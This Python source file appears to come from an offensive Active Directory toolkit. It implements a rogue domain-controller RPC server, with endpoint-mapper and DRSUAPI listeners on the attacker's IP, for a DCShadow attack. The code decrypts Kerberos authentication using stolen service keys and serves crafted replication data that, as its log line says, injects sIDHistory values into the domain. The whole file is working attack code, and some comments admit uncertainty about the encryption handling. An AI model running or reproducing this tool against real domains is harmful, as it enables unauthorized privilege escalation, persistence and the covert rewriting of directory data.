"""
DCShadow DCE/RPC server — EPM + DRSUAPI endpoints.

Implements minimal EPM (port 135) and DRSUAPI (port 1337) servers
that handle exactly one replication cycle for DCShadow injection.
"""

import logging
import struct
import socket
import threading
import os
from typing import Optional, Dict

from .kerberos import KerberosUtils

try:
    from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp
    HAS_DEPS = True
except ImportError:
    HAS_DEPS = False

# DCE/RPC packet types
MSRPC_BIND = 11
MSRPC_BINDACK = 12
MSRPC_REQUEST = 0
MSRPC_RESPONSE = 2
MSRPC_ALTER_CTX = 14
MSRPC_ALTER_CTX_RESP = 15
MSRPC_AUTH3 = 16

# DRSUAPI opnums
DRSUAPI_OPNUM_BIND = 0
DRSUAPI_OPNUM_UNBIND = 1
DRSUAPI_OPNUM_GETNCCHANGES = 3
DRSUAPI_OPNUM_UPDATEREFS = 4

# DRS extension flags
DRS_EXT_BASE                    = 0x00000001
DRS_EXT_RESTORE_USN_OPTIMIZATION = 0x00000004
DRS_EXT_ADDENTRY                = 0x00000080
DRS_EXT_STRONG_ENCRYPTION       = 0x00008000
DRS_EXT_GETCHGREQ_V8            = 0x01000000
DRS_EXT_GETCHGREPLY_V6          = 0x04000000

# SPNEGO OIDs
OID_SPNEGO = '1.2.840.113554.1.2.2'  # Kerberos

# Default ports
EPM_PORT = 135
DRSUAPI_PORT = 1337


class DCShadowRPCServer:
    """
    Minimal DCE/RPC server implementing EPM + DRSUAPI for DCShadow.

    Handles exactly one replication cycle:
    1. EPM ept_map -> return DRSUAPI port
    2. DRSUAPI DsBind -> return handle
    3. DRSUAPI DsGetNCChanges -> return crafted replication data
    4. DRSUAPI DsUpdateRefs -> signal completion
    """

    def __init__(self, attacker_ip: str, service_keys: Dict[str, bytes],
                 repl_data: bytes, rogue_dc_guid: bytes,
                 rogue_invocation_id: bytes,
                 drsuapi_port: int = DRSUAPI_PORT):
        self.attacker_ip = attacker_ip
        self.service_keys = service_keys
        self.repl_data = repl_data
        self.rogue_dc_guid = rogue_dc_guid
        self.rogue_invocation_id = rogue_invocation_id
        self.drsuapi_port = drsuapi_port

        self._epm_server = None
        self._drs_server = None
        self._epm_thread = None
        self._drs_thread = None
        self._replication_done = threading.Event()
        self._session_key = None
        self._session_key_etype = None
        self._seq_number = 0
        self._bind_handle = os.urandom(20)

    def start(self):
        """Start EPM and DRSUAPI servers in background threads."""
        self._epm_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._epm_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._epm_server.settimeout(120)
        self._epm_server.bind((self.attacker_ip, EPM_PORT))
        self._epm_server.listen(1)

        self._drs_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._drs_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._drs_server.settimeout(120)
        self._drs_server.bind((self.attacker_ip, self.drsuapi_port))
        self._drs_server.listen(1)

        self._epm_thread = threading.Thread(
            target=self._serve_epm, daemon=True, name='DCShadow-EPM'
        )
        self._drs_thread = threading.Thread(
            target=self._serve_drsuapi, daemon=True, name='DCShadow-DRSUAPI'
        )

        self._epm_thread.start()
        self._drs_thread.start()
        logging.debug(f"RPC servers started (EPM:{EPM_PORT}, DRSUAPI:{self.drsuapi_port})")

    def wait_for_replication(self, timeout: int = 120) -> bool:
        """Wait for replication to complete."""
        return self._replication_done.wait(timeout=timeout)

    def stop(self):
        """Stop all servers."""
        try:
            if self._epm_server:
                self._epm_server.close()
        except Exception:
            pass
        try:
            if self._drs_server:
                self._drs_server.close()
        except Exception:
            pass

    # -- EPM Server --

    def _serve_epm(self):
        """Handle EPM connection — return DRSUAPI port."""
        try:
            conn, addr = self._epm_server.accept()
            logging.debug(f"EPM connection from {addr}")
            conn.settimeout(30)

            data = conn.recv(4096)
            if not data:
                conn.close()
                return

            # Parse enough to identify it's an ept_map and respond
            self._handle_epm_bind_and_map(data, conn)
            conn.close()
            logging.debug("EPM handler completed")
        except socket.timeout:
            logging.debug("EPM server timeout (no connection)")
        except Exception as e:
            logging.debug(f"EPM server error: {e}")

    def _handle_epm_bind_and_map(self, initial_data: bytes, conn: socket.socket):
        """Handle EPM BIND + ept_map request."""
        # First message should be a BIND
        ptype = initial_data[2]  # packet type at offset 2

        if ptype == MSRPC_BIND:
            # Build BIND_ACK with no auth (EPM doesn't require auth)
            bind_ack = self._build_epm_bind_ack(initial_data)
            conn.sendall(bind_ack)

            # Read the ept_map REQUEST
            data = conn.recv(4096)
            if data and data[2] == MSRPC_REQUEST:
                response = self._build_epm_map_response(data)
                conn.sendall(response)

    def _build_epm_bind_ack(self, bind_data: bytes) -> bytes:
        """Build a BIND_ACK response for EPM."""
        call_id = struct.unpack('<I', bind_data[12:16])[0]

        # Simple BIND_ACK
        # Header: version(1) + minor(1) + type(1) + flags(1) + repr(4) +
        #         frag_len(2) + auth_len(2) + call_id(4)
        header = struct.pack('<BBBBI', 5, 0, MSRPC_BINDACK, 0x03, 0x10)

        # Body: max_xmit(2) + max_recv(2) + assoc_group(4) +
        #       sec_addr_len(2) + sec_addr + padding + num_results(1) + result
        sec_addr = b'\x00'  # empty
        sec_addr_field = struct.pack('<H', 1) + sec_addr
        # Pad to 4-byte alignment
        pad_len = (4 - (len(sec_addr_field) % 4)) % 4
        sec_addr_field += b'\x00' * pad_len

        body = struct.pack('<HHI', 4280, 4280, 0)  # max frag sizes + assoc group
        body += sec_addr_field
        # Num results (4 bytes) + result (acceptance=0, reason=0, transfer syntax)
        body += struct.pack('<I', 1)  # num_results
        body += struct.pack('<HH', 0, 0)  # result=accept, reason=0
        body += b'\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60'  # NDR transfer syntax
        body += struct.pack('<I', 2)  # syntax version

        frag_len = 16 + len(body)
        header += struct.pack('<HHI', frag_len, 0, call_id)

        return header + body

    def _build_epm_map_response(self, request_data: bytes) -> bytes:
        """
        Build ept_map response returning DRSUAPI on our port.

        This is a simplified response that returns a single tower entry
        pointing to our DRSUAPI server.
        """
        call_id = struct.unpack('<I', request_data[12:16])[0]

        # Build the tower for DRSUAPI
        # Floor 1: Interface UUID (DRSUAPI)
        drsuapi_uuid = bytes.fromhex('E3514235-4B06-11D1-AB04-00C04FC2DCD2'.replace('-', ''))
        # Swap byte order for UUID fields
        drsuapi_uuid_wire = (
            drsuapi_uuid[3::-1] +  # time_low (LE)
            drsuapi_uuid[5:3:-1] +  # time_mid (LE)
            drsuapi_uuid[7:5:-1] +  # time_hi (LE)
            drsuapi_uuid[8:16]      # clock_seq + node (BE)
        )

        floor1_lhs = b'\x0d' + drsuapi_uuid_wire + struct.pack('<H', 4)  # version
        floor1 = struct.pack('<H', len(floor1_lhs)) + floor1_lhs + struct.pack('<H', 2) + b'\x00\x00'

        # Floor 2: Transfer syntax (NDR)
        ndr_uuid = bytes.fromhex('045D888AEB1CC9119FE808002B104860')
        ndr_uuid_wire = ndr_uuid[3::-1] + ndr_uuid[5:3:-1] + ndr_uuid[7:5:-1] + ndr_uuid[8:16]
        floor2_lhs = b'\x0d' + ndr_uuid_wire + struct.pack('<H', 2)
        floor2 = struct.pack('<H', len(floor2_lhs)) + floor2_lhs + struct.pack('<H', 2) + b'\x00\x00'

        # Floor 3: RPC protocol (ncacn_ip_tcp = 0x07)
        floor3 = struct.pack('<H', 1) + b'\x07' + struct.pack('<H', 2) + struct.pack('>H', self.drsuapi_port)

        # Floor 4: TCP port
        floor4_ip = socket.inet_aton(self.attacker_ip)
        floor4 = struct.pack('<H', 1) + b'\x09' + struct.pack('<H', len(floor4_ip)) + floor4_ip

        tower_data = floor1 + floor2 + floor3 + floor4
        num_floors = 4
        tower = struct.pack('<H', num_floors) + tower_data

        # NDR response: num_towers(4) + tower_pointer + entry_handle(20)
        # Simplified: return the tower directly
        tower_len = len(tower)
        tower_ref = struct.pack('<I', 1)  # referent id
        tower_with_len = struct.pack('<III', tower_len, 0, tower_len) + tower

        # Response body for ept_map
        resp_body = struct.pack('<I', 1)  # num_towers
        resp_body += struct.pack('<III', 1, 1, 0)  # NDR array header (max, offset, actual)
        resp_body += tower_ref
        resp_body += tower_with_len
        resp_body += b'\x00' * 20  # entry_handle (zeroed = no more entries)
        resp_body += struct.pack('<I', 0)  # status = 0

        # Build RESPONSE header
        alloc_hint = len(resp_body)
        header = struct.pack('<BBBBI', 5, 0, MSRPC_RESPONSE, 0x03, 0x10)
        frag_len = 24 + len(resp_body)
        header += struct.pack('<HHI', frag_len, 0, call_id)
        header += struct.pack('<IHH', alloc_hint, 0, 0)  # alloc_hint, ctx_id, cancel_count+reserved

        return header + resp_body

    # -- DRSUAPI Server --

    def _serve_drsuapi(self):
        """Handle DRSUAPI connection — full replication cycle."""
        try:
            conn, addr = self._drs_server.accept()
            logging.debug(f"DRSUAPI connection from {addr}")
            conn.settimeout(60)

            while True:
                data = self._recv_full_pdu(conn)
                if not data:
                    break

                ptype = data[2]

                if ptype == MSRPC_BIND:
                    response = self._handle_drs_bind(data)
                    conn.sendall(response)

                elif ptype == MSRPC_AUTH3:
                    # AUTH3 completes multi-leg auth — no response needed
                    logging.debug("Received AUTH3 (auth completion)")

                elif ptype == MSRPC_ALTER_CTX:
                    response = self._handle_alter_ctx(data)
                    conn.sendall(response)

                elif ptype == MSRPC_REQUEST:
                    response = self._handle_drs_request(data)
                    if response:
                        conn.sendall(response)

                    # Check if replication is done
                    if self._replication_done.is_set():
                        break

            conn.close()
            logging.debug("DRSUAPI handler completed")

        except socket.timeout:
            logging.debug("DRSUAPI server timeout")
        except Exception as e:
            logging.debug(f"DRSUAPI server error: {e}")
            import traceback
            traceback.print_exc()

    def _recv_full_pdu(self, conn: socket.socket) -> Optional[bytes]:
        """Receive a complete DCE/RPC PDU."""
        try:
            # Read header (at least 16 bytes)
            header = b''
            while len(header) < 16:
                chunk = conn.recv(16 - len(header))
                if not chunk:
                    return None
                header += chunk

            # Get fragment length
            frag_len = struct.unpack('<H', header[8:10])[0]

            # Read remaining
            data = header
            while len(data) < frag_len:
                chunk = conn.recv(frag_len - len(data))
                if not chunk:
                    return None
                data += chunk

            return data

        except Exception:
            return None

    def _handle_drs_bind(self, data: bytes) -> bytes:
        """Handle DRSUAPI BIND with Kerberos authentication."""
        call_id = struct.unpack('<I', data[12:16])[0]
        auth_len = struct.unpack('<H', data[10:12])[0]

        # Extract auth data (SPNEGO wrapping Kerberos AP-REQ)
        if auth_len > 0:
            auth_trailer_start = len(data) - auth_len - 8  # 8 = SEC_TRAILER size
            auth_type = data[auth_trailer_start]
            auth_level = data[auth_trailer_start + 1]
            auth_data = data[auth_trailer_start + 8:]

            logging.debug(f"BIND auth_type={auth_type}, auth_level={auth_level}")

            try:
                # Parse SPNEGO and extract AP-REQ
                ap_req_bytes = self._extract_ap_req_from_spnego(auth_data)

                # Decrypt AP-REQ
                self._session_key, self._session_key_etype, self._seq_number = \
                    KerberosUtils.decrypt_ap_req(ap_req_bytes, self.service_keys)

                logging.debug(f"Kerberos auth successful (etype={self._session_key_etype})")

                # Build AP-REP
                ap_rep = KerberosUtils.build_ap_rep(
                    self._session_key, self._session_key_etype, self._seq_number
                )

                # Wrap in SPNEGO negTokenResp
                resp_token = self._build_spnego_response(ap_rep)

            except Exception as e:
                logging.error(f"Kerberos auth failed: {e}")
                resp_token = b''
        else:
            resp_token = b''

        # Build BIND_ACK
        return self._build_drs_bind_ack(call_id, resp_token, auth_len > 0)

    def _extract_ap_req_from_spnego(self, auth_data: bytes) -> bytes:
        """Extract Kerberos AP-REQ from SPNEGO negTokenInit."""
        try:
            # Try parsing as SPNEGO
            spnego = SPNEGO_NegTokenInit(auth_data)
            mech_tokens = spnego['MechToken']
            if mech_tokens:
                # The mechToken contains the raw AP-REQ
                return bytes(mech_tokens)
        except Exception:
            pass

        # Try raw AP-REQ (no SPNEGO wrapper)
        if auth_data[0] == 0x60:
            # GSS-API OID wrapper
            # Skip the OID prefix to get to the AP-REQ
            idx = 0
            if auth_data[idx] == 0x60:
                idx += 1
                # Length
                if auth_data[idx] & 0x80:
                    num_len_bytes = auth_data[idx] & 0x7f
                    idx += 1 + num_len_bytes
                else:
                    idx += 1
                # OID
                if auth_data[idx] == 0x06:
                    oid_len = auth_data[idx + 1]
                    idx += 2 + oid_len
            return auth_data[idx:]

        return auth_data

    def _build_spnego_response(self, ap_rep: bytes) -> bytes:
        """Build SPNEGO negTokenResp with AP-REP."""
        resp = SPNEGO_NegTokenResp()
        resp['NegState'] = b'\x00'  # accept-completed
        resp['SupportedMech'] = OID_SPNEGO
        resp['ResponseToken'] = ap_rep
        return resp.getData()

    def _build_drs_bind_ack(self, call_id: int, auth_token: bytes,
                            has_auth: bool) -> bytes:
        """Build BIND_ACK response for DRSUAPI."""
        # BIND_ACK body
        body = struct.pack('<HHI', 4280, 4280, 1)  # max frag + assoc group

        # Secondary address (empty)
        body += struct.pack('<H', 1) + b'\x00'
        # Pad to 4-byte boundary
        body += b'\x00'

        # Result list: 1 context accepted
        body += struct.pack('<I', 1)  # num results
        body += struct.pack('<HH', 0, 0)  # result=accept, reason

        # Transfer syntax (NDR 2.0)
        ndr_uuid = bytes.fromhex('045D888AEB1CC9119FE808002B104860')
        ndr_uuid_wire = ndr_uuid[3::-1] + ndr_uuid[5:3:-1] + ndr_uuid[7:5:-1] + ndr_uuid[8:16]
        body += ndr_uuid_wire + struct.pack('<I', 2)

        # Auth trailer
        auth_trailer = b''
        if has_auth and auth_token:
            # Pad body to 4-byte alignment
            pad = (4 - (len(body) % 4)) % 4
            body += b'\x00' * pad

            # SEC_TRAILER: auth_type(1) + auth_level(1) + pad_length(1) +
            #              reserved(1) + context_id(4)
            auth_trailer = struct.pack('<BBBBI', 9, 6, pad, 0, 0)
            auth_trailer += auth_token

        # DCE/RPC header
        auth_len = len(auth_token) if auth_token else 0
        frag_len = 16 + len(body) + len(auth_trailer)

        header = struct.pack('<BBBBI', 5, 0, MSRPC_BINDACK, 0x03, 0x10)
        header += struct.pack('<HHI', frag_len, auth_len, call_id)

        return header + body + auth_trailer

    def _handle_alter_ctx(self, data: bytes) -> bytes:
        """Handle ALTER_CONTEXT — same as BIND_ACK but type 15."""
        call_id = struct.unpack('<I', data[12:16])[0]
        # Reuse bind_ack logic with type changed
        ack = self._build_drs_bind_ack(call_id, b'', False)
        # Change type to ALTER_CTX_RESP
        ack = ack[:2] + bytes([MSRPC_ALTER_CTX_RESP]) + ack[3:]
        return ack

    def _handle_drs_request(self, data: bytes) -> Optional[bytes]:
        """Handle DRSUAPI REQUEST — dispatch by opnum."""
        call_id = struct.unpack('<I', data[12:16])[0]
        auth_len = struct.unpack('<H', data[10:12])[0]

        # Extract opnum from request header (offset 22)
        opnum = struct.unpack('<H', data[22:24])[0]

        # Extract and decrypt stub data if authenticated
        stub_data = self._extract_stub_data(data, auth_len)

        logging.debug(f"DRSUAPI request opnum={opnum}")

        if opnum == DRSUAPI_OPNUM_BIND:
            resp_stub = self._handle_opnum_bind(stub_data)
        elif opnum == DRSUAPI_OPNUM_GETNCCHANGES:
            resp_stub = self._handle_opnum_getncchanges(stub_data)
        elif opnum == DRSUAPI_OPNUM_UPDATEREFS:
            resp_stub = self._handle_opnum_updaterefs(stub_data)
            self._replication_done.set()
        elif opnum == DRSUAPI_OPNUM_UNBIND:
            resp_stub = self._handle_opnum_unbind(stub_data)
        else:
            logging.debug(f"Unknown opnum {opnum}, ignoring")
            return None

        return self._build_response(call_id, opnum, resp_stub, auth_len > 0)

    def _extract_stub_data(self, data: bytes, auth_len: int) -> bytes:
        """Extract (and optionally decrypt) the stub data from a REQUEST."""
        # Header is 24 bytes for REQUEST
        header_len = 24
        if auth_len > 0:
            # Stub data is between header and auth trailer
            auth_trailer_start = len(data) - auth_len - 8
            pad_len = data[auth_trailer_start + 2]
            stub_encrypted = data[header_len:auth_trailer_start - pad_len]
            gss_token = data[auth_trailer_start + 8:]

            if self._session_key:
                try:
                    # The GSS token wraps the stub data
                    # For PKT_PRIVACY: stub data is encrypted in the GSS token
                    # Actually, the stub data in the PDU IS the encrypted data
                    # and the auth verifier is the GSS token
                    full_encrypted = data[header_len:auth_trailer_start]
                    stub_data = KerberosUtils.gss_unwrap(
                        gss_token + full_encrypted,
                        self._session_key, self._session_key_etype
                    )
                    return stub_data
                except Exception as e:
                    logging.debug(f"GSS unwrap failed, using raw stub: {e}")
                    return data[header_len:auth_trailer_start]
        else:
            return data[header_len:]

        return data[header_len:]

    def _handle_opnum_bind(self, stub_data: bytes) -> bytes:
        """Handle DsBind (opnum 0) — return handle + extensions."""
        # Build DRS_EXTENSIONS_INT
        ext_flags = (
            DRS_EXT_BASE |
            DRS_EXT_RESTORE_USN_OPTIMIZATION |
            DRS_EXT_ADDENTRY |
            DRS_EXT_STRONG_ENCRYPTION |
            DRS_EXT_GETCHGREQ_V8 |
            DRS_EXT_GETCHGREPLY_V6
        )

        # DRS_EXTENSIONS_INT: cb(4) + dwFlags(4) + SiteObjGuid(16) + Pid(4) +
        #                     dwReplEpoch(4) + dwFlagsExt(4) + ConfigObjGUID(16) + dwExtCaps(4)
        ext_data = struct.pack('<II', 48, ext_flags)
        ext_data += b'\x00' * 16  # SiteObjGuid
        ext_data += struct.pack('<I', 0)  # Pid
        ext_data += struct.pack('<I', 0)  # dwReplEpoch
        ext_data += struct.pack('<I', 0)  # dwFlagsExt
        ext_data += b'\x00' * 16  # ConfigObjGUID
        ext_data += struct.pack('<I', 0xFFFFFFFF)  # dwExtCaps

        # Response: ppextServer (NDR pointer + data) + phDrs (handle)
        # NDR: referent_id(4) + cb(4) + data...
        resp = struct.pack('<I', 1)  # referent id
        resp += struct.pack('<I', len(ext_data))  # cb
        resp += struct.pack('<I', len(ext_data))  # NDR conformant max
        resp += ext_data
        resp += self._bind_handle  # phDrs (20 bytes)
        resp += struct.pack('<I', 0)  # return value (success)

        return resp

    def _handle_opnum_getncchanges(self, stub_data: bytes) -> bytes:
        """Handle DsGetNCChanges (opnum 3) — return our replication data."""
        logging.debug("Serving DsGetNCChanges with crafted sIDHistory data")
        # Return pre-built replication response
        return self.repl_data

    def _handle_opnum_updaterefs(self, stub_data: bytes) -> bytes:
        """Handle DsUpdateRefs (opnum 4) — acknowledge."""
        logging.debug("DsUpdateRefs received — replication complete")
        return struct.pack('<I', 0)  # success

    def _handle_opnum_unbind(self, stub_data: bytes) -> bytes:
        """Handle DsUnbind (opnum 1)."""
        return b'\x00' * 20 + struct.pack('<I', 0)  # handle + success

    def _build_response(self, call_id: int, opnum: int, stub_data: bytes,
                        has_auth: bool) -> bytes:
        """Build a DCE/RPC RESPONSE PDU."""
        # Optionally encrypt stub data
        auth_trailer = b''
        auth_len = 0

        if has_auth and self._session_key:
            try:
                self._seq_number += 1
                gss_token = KerberosUtils.gss_wrap(
                    stub_data, self._session_key,
                    self._session_key_etype, self._seq_number
                )
                # For PKT_PRIVACY: stub = encrypted, auth_value = GSS token
                # Actually, the entire encrypted blob IS the GSS token
                # Split it: first part replaces stub, second part is verifier
                # This depends on the GSS format...
                # For simplicity with PKT_PRIVACY, the stub data is replaced
                # by the encrypted version
                stub_data = gss_token

                # Auth trailer
                pad = (4 - (len(stub_data) % 4)) % 4
                stub_data += b'\x00' * pad
                auth_trailer = struct.pack('<BBBBI', 9, 6, pad, 0, 0)
                auth_len = 0  # No separate auth verifier for wrapped data
            except Exception as e:
                logging.debug(f"GSS wrap failed, sending unencrypted: {e}")

        # Header
        header = struct.pack('<BBBBI', 5, 0, MSRPC_RESPONSE, 0x03, 0x10)
        frag_len = 24 + len(stub_data) + len(auth_trailer)
        header += struct.pack('<HHI', frag_len, auth_len, call_id)
        header += struct.pack('<IHH', len(stub_data), 0, 0)  # alloc_hint, ctx_id, cancel

        return header + stub_data + auth_trailer
